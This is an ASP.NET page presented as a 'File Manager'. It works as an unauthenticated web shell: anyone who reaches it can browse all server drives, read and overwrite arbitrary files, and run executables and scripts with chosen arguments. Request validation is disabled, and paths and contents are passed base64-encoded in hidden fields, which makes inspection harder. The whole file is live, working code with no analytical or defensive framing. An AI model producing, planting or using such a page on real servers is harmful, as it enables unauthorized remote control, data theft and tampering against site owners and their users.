<%@ Page Language="C#" ValidateRequest="false" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">

    private static string B64Enc(string s)
    {
        if (string.IsNullOrEmpty(s)) return "";
        return Convert.ToBase64String(Encoding.UTF8.GetBytes(s));
    }
    private static string B64Dec(string s)
    {
        if (string.IsNullOrEmpty(s)) return "";
        try { return Encoding.UTF8.GetString(Convert.FromBase64String(s)); }
        catch { return ""; }
    }
    private string F(string key) { return (Request.Form[key] ?? "").Trim(); }

    private string CWD
    {
        get
        {
            string d = Session["cwd"] as string;
            if (string.IsNullOrEmpty(d) || !Directory.Exists(d))
            {
                d = Server.MapPath("~");
                Session["cwd"] = d;
            }
            return d;
        }
        set { Session["cwd"] = value; }
    }

    protected void Page_Load(object sender, EventArgs e)
    {
        if (!IsPostBack) RenderListing();
    }

    protected void BtnGo_Click(object sender, EventArgs e)
    {
        string target = B64Dec(F("hPath"));
        if (string.IsNullOrEmpty(target)) { Msg("Enter a path.", "err"); return; }

        string resolved;
        if (Path.IsPathRooted(target))
            resolved = target;
        else
            resolved = Path.GetFullPath(Path.Combine(CWD, target));

        resolved = resolved.TrimEnd('\\', '/');
        if (resolved.Length == 2 && resolved[1] == ':') resolved += "\\";

        if (Directory.Exists(resolved))
        {
            CWD = resolved;
            RenderListing();
            Msg("Directory: " + resolved, "ok");
        }
        else Msg("Directory not found: " + resolved, "err");
    }

    protected void BtnRead_Click(object sender, EventArgs e)
    {
        string fname = B64Dec(F("hFilename"));
        if (string.IsNullOrEmpty(fname)) { Msg("Enter a filename.", "err"); return; }
        string full = Path.IsPathRooted(fname) ? fname : Path.Combine(CWD, fname);
        if (!File.Exists(full)) { Msg("File not found: " + full, "err"); return; }
        try
        {
            TxtContent.Text     = File.ReadAllText(full, Encoding.UTF8);
            Session["openFile"] = full;
            Session["panel"]    = "editor";
            Msg("Read: " + full, "ok");
            RenderListing();
        }
        catch (Exception ex) { Msg("Read error: " + ex.Message, "err"); }
    }

    protected void BtnWrite_Click(object sender, EventArgs e)
    {
        string fnRaw = F("hFilename");
        string fname = !string.IsNullOrEmpty(fnRaw) ? B64Dec(fnRaw) : (Session["openFile"] as string ?? "");
        if (string.IsNullOrEmpty(fname)) { Msg("Enter a filename.", "err"); return; }
        string full = Path.IsPathRooted(fname) ? fname : Path.Combine(CWD, fname);
        string rawB64 = F("hContentB64");
        string fileContent = string.IsNullOrEmpty(rawB64) ? TxtContent.Text : B64Dec(rawB64);
        try
        {
            File.WriteAllText(full, fileContent, Encoding.UTF8);
            Session["openFile"] = full;
            Msg("Saved: " + full, "ok");
            RenderListing();
        }
        catch (Exception ex) { Msg("Write error: " + ex.Message, "err"); }
    }

    protected void BtnNew_Click(object sender, EventArgs e)
    {
        Session.Remove("openFile");
        TxtContent.Text  = "";
        Session["panel"] = "editor";
        Msg("New file - enter a name and content, then Save.", "info");
    }

    protected void BtnCancelEdit_Click(object sender, EventArgs e)
    {
        Session.Remove("openFile");
        Session.Remove("panel");
        TxtContent.Text = "";
    }

    protected void BtnUp_Click(object sender, EventArgs e)
    {
        DirectoryInfo parent = Directory.GetParent(CWD);
        if (parent != null) { CWD = parent.FullName; RenderListing(); Msg("Up to: " + CWD, "ok"); }
        else Msg("Already at root.", "info");
    }

    protected void BtnExec_Click(object sender, EventArgs e)
    {
        string exeRaw  = F("hExePath");
        string exePath = !string.IsNullOrEmpty(exeRaw) ? B64Dec(exeRaw) : (Session["runExe"] as string ?? "");
        if (string.IsNullOrEmpty(exePath)) { Msg("No executable selected.", "err"); return; }
        string full = Path.IsPathRooted(exePath) ? exePath : Path.Combine(CWD, exePath);
        if (!File.Exists(full)) { Msg("File not found: " + full, "err"); return; }
        string args    = TxtExeArgs.Text;
        string workDir = Path.GetDirectoryName(full);
        try
        {
            var psi = new ProcessStartInfo
            {
                FileName = full, Arguments = args, WorkingDirectory = workDir,
                RedirectStandardOutput = true, RedirectStandardError = true,
                UseShellExecute = false, CreateNoWindow = true
            };
            var proc = new Process { StartInfo = psi };
            proc.Start();
            bool finished = proc.WaitForExit(5000);
            string stdout = proc.StandardOutput.ReadToEnd();
            string stderr = proc.StandardError.ReadToEnd();
            var sb = new StringBuilder();
            sb.AppendLine("=== " + full + " " + args);
            sb.AppendLine("=== Exit: " + (finished ? proc.ExitCode.ToString() : "timeout") + " ===");
            if (!string.IsNullOrEmpty(stdout)) sb.AppendLine(stdout);
            if (!string.IsNullOrEmpty(stderr)) { sb.AppendLine("--- STDERR ---"); sb.AppendLine(stderr); }
            if (!finished) sb.AppendLine("(Process still running - output captured so far)");
            TxtExeOutput.Text   = sb.ToString();
            Session["panel"]    = "exec";
            Msg("Executed: " + Path.GetFileName(full) + (finished ? " (exit " + proc.ExitCode + ")" : " (timeout)"),
                finished && proc.ExitCode == 0 ? "ok" : "err");
        }
        catch (Exception ex) { TxtExeOutput.Text = "ERROR: " + ex.Message; Session["panel"] = "exec"; Msg("Execution failed: " + ex.Message, "err"); }
    }

    protected void BtnCancelExec_Click(object sender, EventArgs e)
    {
        Session.Remove("runExe");
        Session.Remove("panel");
        TxtExeArgs.Text = TxtExeOutput.Text = "";
    }

    private static readonly System.Collections.Generic.HashSet<string> ExeExts =
        new System.Collections.Generic.HashSet<string>(StringComparer.OrdinalIgnoreCase)
        { ".exe", ".bat", ".cmd", ".ps1", ".sh" };

    private void RenderListing()
    {
        LblCwd.Text = Server.HtmlEncode(CWD);
        var sb = new StringBuilder();

        // Drives (Windows)
        try
        {
            foreach (var drive in DriveInfo.GetDrives())
            {
                if (!drive.IsReady && drive.DriveType != DriveType.Fixed) continue;
                string b64 = Server.HtmlEncode(B64Enc(drive.RootDirectory.FullName));
                sb.AppendFormat(
                    "<div class='entry entry-drive' onclick='cdDir(\"{0}\")'>" +
                    "<span class='entry-icon'>&#128190;</span>" +
                    "<span class='entry-name'>{1}</span>" +
                    "</div>",
                    b64, Server.HtmlEncode(drive.Name));
            }
        }
        catch { }

        // Directories
        try
        {
            foreach (string d in Directory.GetDirectories(CWD))
            {
                var di  = new DirectoryInfo(d);
                string b64 = Server.HtmlEncode(B64Enc(di.FullName));
                sb.AppendFormat(
                    "<div class='entry entry-dir' onclick='cdDir(\"{0}\")'>" +
                    "<span class='entry-icon'>&#128193;</span>" +
                    "<span class='entry-name' title='{1}'>{1}</span>" +
                    "</div>",
                    b64, Server.HtmlEncode(di.Name));
            }
        }
        catch { sb.Append("<div class='entry-err'>Cannot list directories.</div>"); }

        // Files
        try
        {
            foreach (string f in Directory.GetFiles(CWD))
            {
                var fi   = new FileInfo(f);
                string b64  = Server.HtmlEncode(B64Enc(fi.FullName));
                bool   isEx = ExeExts.Contains(fi.Extension);
                string cls  = isEx ? "entry entry-exe" : "entry entry-file";
                string icon = isEx ? "&#9881;" : "&#128196;";
                string btns = "<button class='act-btn' onclick='event.stopPropagation();readFile(\"" + b64 + "\")'>Read</button>";
                if (isEx) btns += "<button class='act-btn act-run' onclick='event.stopPropagation();runExe(\"" + b64 + "\",\"" + Server.HtmlEncode(fi.Name) + "\")'>Run</button>";
                sb.AppendFormat(
                    "<div class='{0}'>" +
                    "<span class='entry-icon'>{1}</span>" +
                    "<span class='entry-name' title='{2}'>{2}</span>" +
                    "<span class='entry-meta'>{3}</span>" +
                    "<span class='entry-actions'>{4}</span>" +
                    "</div>",
                    cls, icon,
                    Server.HtmlEncode(fi.Name),
                    FmtBytes(fi.Length),
                    btns);
            }
        }
        catch { sb.Append("<div class='entry-err'>Cannot list files.</div>"); }

        LitListing.Text = sb.ToString();
    }

    protected override void OnPreLoad(EventArgs e)
    {
        base.OnPreLoad(e);
        if (!IsPostBack) return;

        string cdRaw = F("__CDDIR");
        if (!string.IsNullOrEmpty(cdRaw))
        {
            string cd = B64Dec(cdRaw);
            if (!string.IsNullOrEmpty(cd) && Directory.Exists(cd))
            { CWD = cd; RenderListing(); Msg("Entered: " + cd, "ok"); }
            return;
        }
        string rfRaw = F("__RDFILE");
        if (!string.IsNullOrEmpty(rfRaw))
        {
            string rf = B64Dec(rfRaw);
            if (!string.IsNullOrEmpty(rf) && File.Exists(rf))
            {
                try
                {
                    TxtContent.Text     = File.ReadAllText(rf, Encoding.UTF8);
                    Session["openFile"] = rf;
                    Session["panel"]    = "editor";
                    RenderListing();
                    Msg("Read: " + rf, "ok");
                }
                catch (Exception ex) { Msg("Read error: " + ex.Message, "err"); }
            }
            return;
        }
        string runRaw = F("__RUNEXE");
        if (!string.IsNullOrEmpty(runRaw))
        {
            string rp = B64Dec(runRaw);
            if (!string.IsNullOrEmpty(rp))
            {
                Session["runExe"]   = rp;
                Session["panel"]    = "exec";
                TxtExeArgs.Text = TxtExeOutput.Text = "";
                RenderListing();
                Msg("Ready to run: " + Path.GetFileName(rp), "info");
            }
        }
    }

    private void Msg(string text, string kind)
    {
        LblMsg.Text     = Server.HtmlEncode(text);
        LblMsg.CssClass = "msg msg-" + kind;
        LblMsg.Visible  = true;
    }

    private static string FmtBytes(long b)
    {
        if (b < 1024)    return b + "B";
        if (b < 1048576) return (b / 1024.0).ToString("0.0") + "KB";
        return (b / 1048576.0).ToString("0.0") + "MB";
    }

    // For HTML attribute value= (escapes < > & " only)
    protected string OpenFilePath() { return Server.HtmlEncode(Session["openFile"] as string ?? ""); }
    protected string RunExePath()   { return Server.HtmlEncode(Session["runExe"]   as string ?? ""); }
    // For JS string literals: escape backslashes and single quotes
    private static string ToJS(string s)
    {
        if (string.IsNullOrEmpty(s)) return "";
        char bs = (char)92;   // backslash
        char sq = (char)39;   // single quote
        s = s.Replace(bs.ToString(), bs.ToString() + bs.ToString());
        s = s.Replace(sq.ToString(), (char)92 + sq.ToString());
        return s;
    }
    protected string OpenFilePathJS() { return ToJS(Session["openFile"] as string ?? ""); }
    protected string RunExePathJS()   { return ToJS(Session["runExe"]   as string ?? ""); }
    protected string ActivePanel()  { return Session["panel"] as string ?? "none"; }
</script>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>File Manager</title>
<style>
:root {
  --bg:       #0d0f14;
  --surface:  #13161e;
  --surface2: #1a1e2a;
  --border:   #252a38;
  --border2:  #2e3448;
  --accent:   #4f9eff;
  --accent2:  #7b61ff;
  --ok:       #22d392;
  --err:      #ff5f5f;
  --info:     #f0c040;
  --run:      #ff9f40;
  --text:     #d4daf0;
  --muted:    #606880;
  --dim:      #3a3f55;
  --mono:     'Courier New', monospace;
  --sans:     'Segoe UI', system-ui, sans-serif;
  --sidebar:  260px;
  --hdr:      48px;
}
*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
html, body { height: 100%; overflow: hidden; }
body { background: var(--bg); color: var(--text); font-family: var(--sans); font-size: 13px; display: flex; flex-direction: column; }

/* ── Hidden inputs ── */
input[type=hidden] { display: none !important; }

/* ── Top bar ── */
.topbar {
  height: var(--hdr);
  background: var(--surface);
  border-bottom: 1px solid var(--border);
  display: flex;
  align-items: center;
  gap: 10px;
  padding: 0 14px;
  flex-shrink: 0;
  z-index: 10;
}
.topbar-logo { font-weight: 700; font-size: 14px; letter-spacing: .04em;
  background: linear-gradient(90deg, var(--accent), var(--accent2));
  -webkit-background-clip: text; -webkit-text-fill-color: transparent; white-space: nowrap; }
.topbar-path { font-family: var(--mono); font-size: 11px; color: var(--muted);
  flex: 1; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
  background: var(--surface2); border: 1px solid var(--border); border-radius: 5px; padding: 3px 8px; }
.topbar-msg { font-size: 11px; padding: 3px 10px; border-radius: 5px; white-space: nowrap; max-width: 400px; overflow: hidden; text-overflow: ellipsis; }
.msg-ok   { background:#0a2a1e; border:1px solid #1e5040; color:var(--ok);   }
.msg-err  { background:#2a0e0e; border:1px solid #5a2020; color:var(--err);  }
.msg-info { background:#2a2208; border:1px solid #5a4a10; color:var(--info); }

/* ── Main layout: sidebar + content ── */
.layout {
  display: flex;
  flex: 1;
  overflow: hidden;
  height: calc(100vh - var(--hdr));
  min-height: 0;
}

/* ── Sidebar ── */
.sidebar {
  width: var(--sidebar);
  min-width: var(--sidebar);
  max-width: var(--sidebar);
  background: var(--surface);
  border-right: 1px solid var(--border);
  display: flex;
  flex-direction: column;
  overflow: hidden;
  height: 100%;
}
.sidebar-nav {
  display: flex;
  gap: 4px;
  padding: 8px 8px 6px;
  border-bottom: 1px solid var(--border);
  flex-shrink: 0;
}
.sidebar-search {
  padding: 6px 8px;
  border-bottom: 1px solid var(--border);
  flex-shrink: 0;
}
.sidebar-search input {
  width: 100%;
  background: var(--surface2);
  border: 1px solid var(--border);
  color: var(--text);
  border-radius: 5px;
  padding: 4px 8px;
  font-size: 12px;
  font-family: var(--mono);
  outline: none;
}
.sidebar-search input:focus { border-color: var(--accent); }
.sidebar-list {
  flex: 1;
  overflow-y: scroll;
  overflow-x: hidden;
  padding: 4px 0;
  min-height: 0;
}

/* ── File entries ── */
.entry {
  display: flex;
  align-items: center;
  gap: 6px;
  padding: 4px 8px;
  cursor: pointer;
  border-radius: 4px;
  margin: 0 4px;
  transition: background .1s;
  user-select: none;
  min-height: 28px;
}
.entry:hover { background: var(--surface2); }
.entry-icon { font-size: 13px; flex-shrink: 0; width: 16px; text-align: center; }
.entry-name { flex: 1; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; font-size: 12px; }
.entry-meta { font-size: 10px; color: var(--muted); flex-shrink: 0; }
.entry-actions { display: flex; gap: 3px; flex-shrink: 0; opacity: 0; transition: opacity .15s; }
.entry:hover .entry-actions { opacity: 1; }
.entry-drive .entry-name { color: var(--accent2); font-weight: 600; }
.entry-dir   .entry-name { color: var(--accent); }
.entry-exe   .entry-name { color: var(--run); }
.entry-file  .entry-name { color: var(--text); }
.entry-err { color: var(--err); font-size: 11px; padding: 6px 10px; font-style: italic; }

.act-btn {
  background: var(--surface);
  border: 1px solid var(--border2);
  color: var(--muted);
  border-radius: 3px;
  padding: 1px 6px;
  font-size: 10px;
  cursor: pointer;
  transition: color .1s, border-color .1s;
}
.act-btn:hover     { color: var(--accent); border-color: var(--accent); }
.act-run:hover     { color: var(--run); border-color: var(--run); }

/* ── Resize handle ── */
.resize-handle {
  width: 4px;
  background: transparent;
  cursor: col-resize;
  flex-shrink: 0;
  transition: background .15s;
}
.resize-handle:hover, .resize-handle.dragging { background: var(--accent); }

/* ── Main content ── */
.main {
  flex: 1;
  overflow: hidden;
  display: flex;
  flex-direction: column;
  min-width: 0;
}

/* ── Panel tabs ── */
.panel-tabs {
  display: flex;
  gap: 1px;
  background: var(--border);
  flex-shrink: 0;
}
.tab {
  padding: 8px 16px;
  font-size: 12px;
  font-weight: 600;
  color: var(--muted);
  cursor: pointer;
  background: var(--surface2);
  border: none;
  transition: color .1s, background .1s;
  display: flex;
  align-items: center;
  gap: 6px;
}
.tab:hover    { color: var(--text); background: var(--surface); }
.tab.active   { color: var(--text); background: var(--bg); }
.tab .tab-x   { font-size: 10px; color: var(--muted); margin-left: 4px; }
.tab:hover .tab-x { color: var(--err); }

/* ── Panel body ── */
.panel-body {
  flex: 1;
  overflow-y: auto;
  display: flex;
  flex-direction: column;
  padding: 14px;
  background: var(--bg);
  min-height: 0;
}
.panel-welcome {
  flex: 1;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  color: var(--dim);
  gap: 10px;
}
.panel-welcome svg { opacity: .25; }
.panel-welcome p   { font-size: 13px; }

/* ── Editor ── */
.editor-topbar {
  display: flex;
  align-items: center;
  gap: 8px;
  margin-bottom: 10px;
  flex-shrink: 0;
}
.editor-topbar input {
  flex: 1;
  background: var(--surface2);
  border: 1px solid var(--border);
  color: var(--text);
  border-radius: 5px;
  padding: 5px 10px;
  font-family: var(--mono);
  font-size: 12px;
  outline: none;
}
.editor-topbar input:focus { border-color: var(--accent); }
textarea.editor {
  flex: 1;
  min-height: 300px;
  background: var(--surface2);
  border: 1px solid var(--border);
  color: #c8d4f0;
  border-radius: 6px;
  padding: 10px;
  font-family: var(--mono);
  font-size: 12px;
  line-height: 1.6;
  resize: vertical;
  outline: none;
  transition: border-color .15s;
}
textarea.editor:focus { border-color: var(--accent); }
.editor-actions { display: flex; gap: 8px; margin-top: 10px; flex-shrink: 0; }

/* ── Exec panel ── */
.exec-topbar { display: flex; align-items: center; gap: 8px; margin-bottom: 10px; flex-shrink: 0; }
.exec-path {
  flex: 1; background: var(--surface2); border: 1px solid var(--border);
  color: var(--run); border-radius: 5px; padding: 5px 10px;
  font-family: var(--mono); font-size: 12px; outline: none;
}
textarea.console {
  flex: 1;
  min-height: 300px;
  background: #050810;
  border: 1px solid var(--border);
  color: #7dff9a;
  border-radius: 6px;
  padding: 10px;
  font-family: var(--mono);
  font-size: 12px;
  line-height: 1.55;
  resize: vertical;
  outline: none;
}
.exec-args-row { display: flex; gap: 8px; margin-bottom: 10px; flex-shrink: 0; align-items: center; }
.exec-args-row label { font-size: 11px; color: var(--muted); white-space: nowrap; }
.exec-args-row input {
  flex: 1; background: var(--surface2); border: 1px solid var(--border);
  color: var(--text); border-radius: 5px; padding: 5px 10px;
  font-family: var(--mono); font-size: 12px; outline: none;
}
.exec-args-row input:focus { border-color: var(--accent); }
.exec-actions { display: flex; gap: 8px; margin-top: 10px; flex-shrink: 0; }

/* ── Nav / cd row inside sidebar ── */
.cd-row { display: flex; gap: 4px; padding: 6px 8px; flex-shrink: 0; border-top: 1px solid var(--border); }
.cd-row input {
  flex: 1; background: var(--surface2); border: 1px solid var(--border);
  color: var(--text); border-radius: 5px; padding: 4px 8px;
  font-family: var(--mono); font-size: 11px; outline: none;
}
.cd-row input:focus { border-color: var(--accent); }

/* ── Buttons ── */
.btn {
  display: inline-flex; align-items: center; gap: 5px;
  padding: 5px 12px; border: none; border-radius: 6px;
  font-size: 12px; font-weight: 600; cursor: pointer;
  transition: filter .15s, transform .1s; white-space: nowrap;
}
.btn:active { transform: scale(.97); }
.btn:hover  { filter: brightness(1.12); }
.btn-sm     { padding: 3px 9px; font-size: 11px; }
.btn-primary { background: var(--accent);  color: #fff; }
.btn-ghost   { background: var(--surface2); color: var(--text); border: 1px solid var(--border); }
.btn-danger  { background: #3a1a1a; color: var(--err); border: 1px solid #5a2a2a; }
.btn-success { background: #0e3028; color: var(--ok);  border: 1px solid #1e5040; }
.btn-run     { background: #2a1e08; color: var(--run); border: 1px solid #5a3e10; }

/* ── Scrollbar ── */
::-webkit-scrollbar { width: 5px; height: 5px; }
::-webkit-scrollbar-track { background: transparent; }
::-webkit-scrollbar-thumb { background: var(--border2); border-radius: 3px; }
::-webkit-scrollbar-thumb:hover { background: var(--muted); }
</style>
</head>
<body>
<form id="fm" runat="server">

  <!-- All hidden transport fields -->
  <input type="hidden" id="hPath"       name="hPath"       />
  <input type="hidden" id="hFilename"   name="hFilename"   />
  <input type="hidden" id="hExePath"    name="hExePath"    />
  <input type="hidden" id="hContentB64" name="hContentB64" />
  <input type="hidden" id="hCdDir"      name="__CDDIR"     />
  <input type="hidden" id="hRdFile"     name="__RDFILE"    />
  <input type="hidden" id="hRunExe"     name="__RUNEXE"    />

  <!-- ── Top bar ── -->
  <div class="topbar">
    <span class="topbar-logo">&#128193; File Manager</span>
    <span class="topbar-path" id="cwdDisplay"><asp:Literal ID="LblCwd" runat="server"/></span>
    <asp:Label ID="LblMsg" runat="server" Visible="false" CssClass="topbar-msg"/>
  </div>

  <div class="layout">

    <!-- ── Sidebar ── -->
    <div class="sidebar" id="sidebar">

      <!-- Sidebar top nav buttons -->
      <div class="sidebar-nav">
        <asp:Button ID="BtnUp"  runat="server" Text="Up"       CssClass="btn btn-ghost btn-sm" OnClick="BtnUp_Click"/>
        <asp:Button ID="BtnNew" runat="server" Text="New File"  CssClass="btn btn-primary btn-sm" OnClick="BtnNew_Click"/>
      </div>

      <!-- Filter -->
      <div class="sidebar-search">
        <input type="text" id="filterInput" placeholder="Filter files..." oninput="filterEntries(this.value)" autocomplete="off"/>
      </div>

      <!-- File listing -->
      <div class="sidebar-list" id="sidebarList">
        <asp:Literal ID="LitListing" runat="server"/>
      </div>

      <!-- CD / go-to row -->
      <div class="cd-row">
        <input type="text" id="visPath" placeholder="Go to path..." autocomplete="off"
               onkeydown="if(event.key==='Enter'){encodeToHidden('visPath','hPath');document.getElementById('<%= BtnGo.ClientID %>').click();}"/>
        <asp:Button ID="BtnGo" runat="server" Text="Go" CssClass="btn btn-ghost btn-sm" OnClick="BtnGo_Click"
                    OnClientClick="encodeToHidden('visPath','hPath'); return true;"/>
      </div>

    </div>

    <!-- ── Resize handle ── -->
    <div class="resize-handle" id="resizeHandle"></div>

    <!-- ── Main panel ── -->
    <div class="main" id="mainPanel">

      <!-- Tabs -->
      <div class="panel-tabs" id="panelTabs">
        <button type="button" class="tab" id="tabWelcome" onclick="showPanel('welcome')">Browse</button>
        <button type="button" class="tab" id="tabEditor"  onclick="showPanel('editor')" style="display:none">
          <span id="tabEditorName">Editor</span>
          <span class="tab-x" onclick="closeEditor(event)">x</span>
        </button>
        <button type="button" class="tab" id="tabExec" onclick="showPanel('exec')" style="display:none">
          <span id="tabExecName">Execute</span>
          <span class="tab-x" onclick="closeExec(event)">x</span>
        </button>
      </div>

      <!-- Welcome / browse panel -->
      <div class="panel-body" id="panelWelcome">
        <div class="panel-welcome">
          <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>
          <p>Select a file from the sidebar to read or run it.</p>
          <p style="font-size:11px;color:var(--dim)">Hover a file to see action buttons.</p>
        </div>
      </div>

      <!-- Editor panel -->
      <div class="panel-body" id="panelEditor" style="display:none">
        <div class="editor-topbar">
          <span style="font-size:11px;color:var(--muted);white-space:nowrap;">File:</span>
          <input type="text" id="visFilename" placeholder="filename.txt" value="<%= OpenFilePath() %>"/>
        </div>
        <asp:TextBox ID="TxtContent" runat="server" TextMode="MultiLine" CssClass="editor"/>
        <div class="editor-actions">
          <asp:Button ID="BtnWrite"      runat="server" Text="Save"  CssClass="btn btn-success" OnClick="BtnWrite_Click"
                      OnClientClick="encodeToHidden('visFilename','hFilename'); encodeContentB64(); return true;"/>
          <asp:Button ID="BtnCancelEdit" runat="server" Text="Close" CssClass="btn btn-danger"  OnClick="BtnCancelEdit_Click" CausesValidation="false"/>
        </div>
      </div>

      <!-- Execute panel -->
      <div class="panel-body" id="panelExec" style="display:none">
        <div class="exec-topbar">
          <span style="font-size:11px;color:var(--muted);white-space:nowrap;">Exe:</span>
          <input type="text" id="visExePath" class="exec-path" readonly value="<%= RunExePath() %>"/>
        </div>
        <div class="exec-args-row">
          <label>Args:</label>
          <asp:TextBox ID="TxtExeArgs" runat="server" placeholder="optional arguments..."/>
        </div>
        <asp:TextBox ID="TxtExeOutput" runat="server" TextMode="MultiLine" CssClass="console" ReadOnly="true"/>
        <div class="exec-actions">
          <asp:Button ID="BtnExec"       runat="server" Text="Run"   CssClass="btn btn-run"    OnClick="BtnExec_Click"
                      OnClientClick="encodeToHidden('visExePath','hExePath'); return true;"/>
          <asp:Button ID="BtnCancelExec" runat="server" Text="Close" CssClass="btn btn-danger" OnClick="BtnCancelExec_Click" CausesValidation="false"/>
        </div>
      </div>

    </div><!-- /main -->
  </div><!-- /layout -->

<script>
function b64Enc(s) { return btoa(unescape(encodeURIComponent(s))); }
function b64Dec(s) { try { return decodeURIComponent(escape(atob(s))); } catch(e) { return ''; } }

function encodeToHidden(visId, hidName) {
  var vis = document.getElementById(visId);
  var hid = document.querySelector('[name="' + hidName + '"]');
  if (vis && hid) hid.value = vis.value ? b64Enc(vis.value) : '';
}

function encodeContentB64() {
  var ta  = document.getElementById('<%= TxtContent.ClientID %>');
  var hid = document.querySelector('[name="hContentB64"]');
  if (ta && hid) { hid.value = b64Enc(ta.value); ta.value = ''; }
}

// Row-action helpers called from listing buttons
function cdDir(b64path) {
  document.querySelector('[name="__CDDIR"]').value = b64path;
  document.getElementById('fm').submit();
}
function readFile(b64path) {
  document.querySelector('[name="__RDFILE"]').value = b64path;
  document.getElementById('fm').submit();
}
function runExe(b64path, name) {
  document.querySelector('[name="__RUNEXE"]').value = b64path;
  document.getElementById('fm').submit();
}

// Panel switching
function showPanel(name) {
  ['welcome','editor','exec'].forEach(function(p) {
    document.getElementById('panel' + p.charAt(0).toUpperCase() + p.slice(1)).style.display = (p === name) ? 'flex' : 'none';
    var t = document.getElementById('tab' + p.charAt(0).toUpperCase() + p.slice(1));
    if (t) t.classList.toggle('active', p === name);
  });
}

function closeEditor(e) {
  e.stopPropagation();
  document.getElementById('<%= BtnCancelEdit.ClientID %>').click();
}
function closeExec(e) {
  e.stopPropagation();
  document.getElementById('<%= BtnCancelExec.ClientID %>').click();
}

// Filter sidebar entries
function filterEntries(q) {
  q = q.toLowerCase();
  document.querySelectorAll('#sidebarList .entry').forEach(function(el) {
    var name = el.querySelector('.entry-name');
    el.style.display = (!q || (name && name.textContent.toLowerCase().includes(q))) ? '' : 'none';
  });
}

// ── On load: restore active panel from server session ──────────────────────
(function() {
  var active = '<%= ActivePanel() %>';
  var editorFile = '<%= OpenFilePathJS() %>';
  var execFile   = '<%= RunExePathJS() %>';

  // Show editor tab if there's an open file
  if (editorFile) {
    document.getElementById('tabEditor').style.display = '';
    var short = editorFile.split(/[\\/]/).pop();
    document.getElementById('tabEditorName').textContent = short || 'Editor';
  }
  // Show exec tab if there's a run target
  if (execFile) {
    document.getElementById('tabExec').style.display = '';
    var short2 = execFile.split(/[\\/]/).pop();
    document.getElementById('tabExecName').textContent = short2 || 'Execute';
  }

  if (active === 'editor' && editorFile) { showPanel('editor'); }
  else if (active === 'exec' && execFile) { showPanel('exec'); }
  else { showPanel('welcome'); }

  // Sync visExePath display
  var exeInput = document.getElementById('visExePath');
  if (exeInput && execFile) exeInput.value = execFile;
})();

// ── Resizable sidebar ─────────────────────────────────────────────────────
(function() {
  var handle = document.getElementById('resizeHandle');
  var sidebar = document.getElementById('sidebar');
  var dragging = false;
  var startX, startW;

  handle.addEventListener('mousedown', function(e) {
    dragging = true;
    startX = e.clientX;
    startW = sidebar.offsetWidth;
    handle.classList.add('dragging');
    document.body.style.cursor = 'col-resize';
    document.body.style.userSelect = 'none';
  });
  document.addEventListener('mousemove', function(e) {
    if (!dragging) return;
    var w = Math.min(500, Math.max(160, startW + (e.clientX - startX)));
    sidebar.style.width = w + 'px';
    sidebar.style.minWidth = w + 'px';
  });
  document.addEventListener('mouseup', function() {
    if (!dragging) return;
    dragging = false;
    handle.classList.remove('dragging');
    document.body.style.cursor = '';
    document.body.style.userSelect = '';
  });
})();
</script>

</form>
</body>
</html>
